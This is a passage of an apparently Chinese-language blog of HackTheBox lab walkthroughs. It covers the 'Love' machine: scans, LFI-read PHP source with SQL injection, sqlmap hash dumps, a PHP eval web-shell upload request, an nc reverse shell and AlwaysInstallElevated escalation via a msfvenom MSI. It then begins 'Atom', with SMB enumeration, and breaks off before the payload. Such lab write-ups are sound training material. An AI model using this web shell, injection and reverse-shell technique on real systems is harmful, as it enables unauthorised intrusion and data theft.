class="string">SF:connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(TerminalServerCookie,49,</span><br><span class="line">SF:<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20t</span></span><br><span class="line"><span class="string">SF:o\x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(Kerberos,49,<span class="string">&quot;E\0\0\</span></span><br><span class="line"><span class="string">SF:x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20co</span></span><br><span class="line"><span class="string">SF:nnect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(X11Probe,49,<span class="string">&quot;E\0\0\x01\xff</span></span><br><span class="line"><span class="string">SF:j\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x</span></span><br><span class="line"><span class="string">SF:20to\x20this\x20MariaDB\x20server&quot;</span>)%r(FourOhFourRequest,49,<span class="string">&quot;E\0\0\x01\x</span></span><br><span class="line"><span class="string">SF:ffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect</span></span><br><span class="line"><span class="string">SF:\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(LDAPSearchReq,49,<span class="string">&quot;E\0\0\x01\xff</span></span><br><span class="line"><span class="string">SF:j\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x</span></span><br><span class="line"><span class="string">SF:20to\x20this\x20MariaDB\x20server&quot;</span>)%r(LDAPBindReq,49,<span class="string">&quot;E\0\0\x01\xffj\x0</span></span><br><span class="line"><span class="string">SF:4Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x20to</span></span><br><span class="line"><span class="string">SF:\x20this\x20MariaDB\x20server&quot;</span>)%r(SIPOptions,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host</span></span><br><span class="line"><span class="string">SF:\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20t</span></span><br><span class="line"><span class="string">SF:his\x20MariaDB\x20server&quot;</span>)%r(TerminalServer,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\</span></span><br><span class="line"><span class="string">SF:x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20th</span></span><br><span class="line"><span class="string">SF:is\x20MariaDB\x20server&quot;</span>)%r(NCP,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.</span></span><br><span class="line"><span class="string">SF:16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaD</span></span><br><span class="line"><span class="string">SF:B\x20server&quot;</span>)%r(JavaRMI,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x</span></span><br><span class="line"><span class="string">SF:20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20ser</span></span><br><span class="line"><span class="string">SF:ver&quot;</span>);</span><br><span class="line">Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p 443 10.10.10.239</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.239</span><br><span class="line">Host is up (0.75s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">443/tcp  open  ssl/http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=<span class="keyword">in</span></span><br><span class="line">| Not valid before: 2021-01-18T14:00:16</span><br><span class="line">|_Not valid after:  2022-01-18T14:00:16</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (95%), Microsoft Windows Longhorn (95%), Microsoft Windows 10 1703 (93%), Microsoft Windows Server 2008 R2 (93%), Microsoft Windows 7 SP1 (93%), Microsoft Windows Vista SP1 (93%), Microsoft Windows 10 1709 - 1803 (93%), Microsoft Windows 10 1809 - 1909 (93%), Microsoft Windows 10 1511 (92%), Microsoft Windows Server 2008 SP2 (92%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Hosts: www.example.com, www.love.htb</span><br></pre></td></tr></table></figure>
<p>这里需要对SSL端口进行更加详细的扫描才能得到域名<code>staging.love.htb</code><br />
不使用域名访问443端口则会被403<br />
5000端口则是直接403</p>
<h2 id="漏洞利用-3"><a class="markdownIt-Anchor" href="#漏洞利用-3"></a> 漏洞利用</h2>
<p>用域名访问443端口可以看到一个LFI漏洞<br />
file协议读取即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">#C:\xampp\htdocs\omrs\login.php</span></span><br><span class="line">	session_start();</span><br><span class="line">	<span class="keyword">include</span> <span class="string">&#x27;includes/conn.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">		<span class="variable">$voter</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;voter&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM voters WHERE voters_id = &#x27;<span class="subst">$voter</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$query</span> = <span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$query</span>-&gt;num_rows &lt; <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Cannot find voter with the ID&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$row</span> = <span class="variable">$query</span>-&gt;fetch_assoc();</span><br><span class="line">			<span class="keyword">if</span>(password_verify(<span class="variable">$password</span>, <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">				<span class="variable">$_SESSION</span>[<span class="string">&#x27;voter&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Incorrect password&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Input voter credentials first&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	header(<span class="string">&#x27;location: index.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">#C:\xampp\htdocs\omrs\admin\includes\conn.php</span></span><br><span class="line">	<span class="variable">$conn</span> = <span class="keyword">new</span> mysqli(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;votesystem&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">	    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">#C:\xampp\htdocs\omrs\admin\login.php</span></span><br><span class="line">	session_start();</span><br><span class="line">	<span class="keyword">include</span> <span class="string">&#x27;includes/conn.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM admin WHERE username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$query</span> = <span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$query</span>-&gt;num_rows &lt; <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Cannot find account with the username&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$row</span> = <span class="variable">$query</span>-&gt;fetch_assoc();</span><br><span class="line">			<span class="keyword">if</span>(password_verify(<span class="variable">$password</span>, <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">				<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Incorrect password&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Input admin credentials first&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	header(<span class="string">&#x27;location: index.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">#C:\xampp\htdocs\omrs\admin\includes\conn.php</span></span><br><span class="line">	<span class="variable">$conn</span> = <span class="keyword">new</span> mysqli(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;votesystem&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">	    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>明显地存在SQL注入</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/login.php&quot;</span> -data <span class="string">&quot;voter=123&amp;password=321&amp;login=&quot;</span> --dbs</span><br><span class="line">available databases [6]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] phpmyadmin</span><br><span class="line">[*] <span class="built_in">test</span></span><br><span class="line">[*] votesystem</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/admin/login.php&quot;</span> -data <span class="string">&quot;username=123&amp;password=321&amp;login=&quot;</span> -D votesystem --tables</span><br><span class="line">Database: votesystem</span><br><span class="line">[5 tables]</span><br><span class="line">+------------+</span><br><span class="line">| admin      |</span><br><span class="line">| candidates |</span><br><span class="line">| positions  |</span><br><span class="line">| voters     |</span><br><span class="line">| votes      |</span><br><span class="line">+------------+</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/admin/login.php&quot;</span> -data <span class="string">&quot;username=123&amp;password=321&amp;login=&quot;</span> -D votesystem -T admin --columns</span><br><span class="line">Database: votesystem</span><br><span class="line">Table: admin</span><br><span class="line">[7 columns]</span><br><span class="line">+------------+--------------+</span><br><span class="line">| Column     | Type         |</span><br><span class="line">+------------+--------------+</span><br><span class="line">| created_on | date         |</span><br><span class="line">| firstname  | varchar(50)  |</span><br><span class="line">| id         | int(11)      |</span><br><span class="line">| lastname   | varchar(50)  |</span><br><span class="line">| password   | varchar(60)  |</span><br><span class="line">| photo      | varchar(150) |</span><br><span class="line">| username   | varchar(50)  |</span><br><span class="line">+------------+--------------+</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/admin/login.php&quot;</span> -data <span class="string">&quot;username=123&amp;password=321&amp;login=&quot;</span> -D votesystem -T admin -C username, password --dump</span><br><span class="line">Database: votesystem</span><br><span class="line">Table: admin</span><br><span class="line">[1 entry]</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| username | password                                                     |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| admin    | $2y$10<span class="variable">$4E3VVe2PWlTMejquTmMD6</span>.Og9RmmFN.K5A1n99kHNdQxHePutFjsC |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/admin/login.php&quot;</span> -data <span class="string">&quot;username=123&amp;password=321&amp;login=&quot;</span> -D votesystem -T voters --columns</span><br><span class="line">Database: votesystem</span><br><span class="line">Table: voters</span><br><span class="line">[6 columns]</span><br><span class="line">+-----------+--------------+</span><br><span class="line">| Column    | Type         |</span><br><span class="line">+-----------+--------------+</span><br><span class="line">| firstname | varchar(30)  |</span><br><span class="line">| id        | int(11)      |</span><br><span class="line">| lastname  | varchar(30)  |</span><br><span class="line">| password  | varchar(60)  |</span><br><span class="line">| photo     | varchar(150) |</span><br><span class="line">| voters_id | varchar(15)  |</span><br><span class="line">+-----------+--------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/admin/login.php&quot;</span> -data <span class="string">&quot;username=123&amp;password=321&amp;login=&quot;</span> -D votesystem -T voters -C voters_id, password --dump</span><br><span class="line">+-----------+----------+</span><br><span class="line">| voters_id | password |</span><br><span class="line">+-----------+----------+</span><br><span class="line">+-----------+----------+</span><br></pre></td></tr></table></figure>
<p>然而这里Hash爆破速度过慢, Bcrypt的运算复杂程度远高于md5</p>
<p><s>看了眼别人WP</s><br />
用443端口的功能访问本地5000得到登入凭证<br />
<code>admin:@LoveIsInTheAir!!!!</code><br />
<s>一直用渗透的常规思路打这台靶机, 没想到整这么一出</s><br />
登入后台后上传Shell</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/voters_add.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>10.10.10.239</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------7586397232801671174932942436</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>696</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://10.10.10.239</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://10.10.10.239/admin/voters.php</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=uofg65u57tbm4rp6jbn0359660</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line">-----------------------------7586397232801671174932942436</span><br><span class="line">Content-Disposition: form-data; name=&quot;firstname&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">-----------------------------7586397232801671174932942436</span><br><span class="line">Content-Disposition: form-data; name=&quot;lastname&quot;</span><br><span class="line"></span><br><span class="line">2</span><br><span class="line">-----------------------------7586397232801671174932942436</span><br><span class="line">Content-Disposition: form-data; name=&quot;password&quot;</span><br><span class="line"></span><br><span class="line">333</span><br><span class="line">-----------------------------7586397232801671174932942436</span><br><span class="line">Content-Disposition: form-data; name=&quot;photo&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;</span><br><span class="line"></span><br><span class="line">-----------------------------7586397232801671174932942436</span><br><span class="line">Content-Disposition: form-data; name=&quot;add&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------7586397232801671174932942436--</span><br></pre></td></tr></table></figure>
<p>蚁剑上传nc反弹shell</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\phoebe\desktop\user.txt</span><br><span class="line">fc8833cab6af6700441328fd2a4ecc04</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-3"><a class="markdownIt-Anchor" href="#权限提升-3"></a> 权限提升</h2>
<blockquote>
<p>找到alwaysinstallelevated，即当注册表中的alwaysinstallelevated设置为1时，机器上运行任何的msi程序，均会以system权限执行，我们只需生成一个msi的木马程序即可提权。<br />
<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/375373404">https://zhuanlan.zhihu.com/p/375373404</a></p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line"></span><br><span class="line">HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">    AlwaysInstallElevated    REG_DWORD    0x1</span><br><span class="line"></span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line">    AlwaysInstallElevated    REG_DWORD    0x1</span><br></pre></td></tr></table></figure>
<p>msfvenom生成一个Shell即可</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br><span class="line">a0f54f7853efdefe4c8cef97186db4c8</span><br></pre></td></tr></table></figure>
<blockquote>
<p>msfvenom &amp; nc</p>
</blockquote>
<p>本着能不用MSF就不用了MSF的原则<br />
没有使用meterpreter<br />
但是发现有(staged)标识还是不能用nc直接接收Shell的<br />
最后用<code>windows/x64/shell/reverse_tcp</code></p>
<hr />
<h1 id="hackthebox_atom"><a class="markdownIt-Anchor" href="#hackthebox_atom"></a> HackTheBox_Atom</h1>
<h2 id="端口扫描-4"><a class="markdownIt-Anchor" href="#端口扫描-4"></a> 端口扫描</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.237</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.237</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line">Not shown: 996 filtered ports</span><br><span class="line">PORT    STATE SERVICE      VERSION</span><br><span class="line">80/tcp  open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">135/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">443/tcp open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-4"><a class="markdownIt-Anchor" href="#漏洞利用-4"></a> 漏洞利用</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 10.10.10.237</span><br><span class="line"></span><br><span class="line">	Sharename       Type      Comment</span><br><span class="line">	---------       ----      -------</span><br><span class="line">	ADMIN$          Disk      Remote Admin</span><br><span class="line">	C$              Disk      Default share</span><br><span class="line">	IPC$            IPC       Remote IPC</span><br><span class="line">	Software_Updates Disk      </span><br><span class="line">SMB1 disabled -- no workgroup available</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">smbclient \\\\10.10.10.237\\software_updates</span><br><span class="line"></span><br><span class="line">smb: \&gt; dir</span><br><span class="line">  .                                   D        0  Fri Jun 11 11:18:21 2021</span><br><span class="line">  ..                                  D        0  Fri Jun 11 11:18:21 2021</span><br><span class="line">  client1                             D        0  Fri Jun 11 11:18:21 2021</span><br><span class="line">  client3                             D        0  Fri Jun 11 11:18:21 2021</span><br><span class="line">  UAT_Testing_Procedures.pdf          A    35202  Fri Apr  9 19:18:08 2021</span><br><span class="line">		4413951 blocks of size 4096. 1381036 blocks available</span><br><span class="line">smb: \&gt; get UAT_Testing_Procedures.pdf</span><br><span class="line">getting file \UAT_Testing_Procedures.pdf of size 35202 as UAT_Testing_Procedures.pdf (6.3 KiloBytes/sec) (average 6.3 KiloBytes/sec)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Note taking application built with electron-builder which helps users in taking important<br />
notes.</p>
</blockquote>
<p><code>electron-builder</code>可以在google上搜到一个RCE漏洞</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html">https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html</a></p>
</blockquote>
<p>构造payload</p>
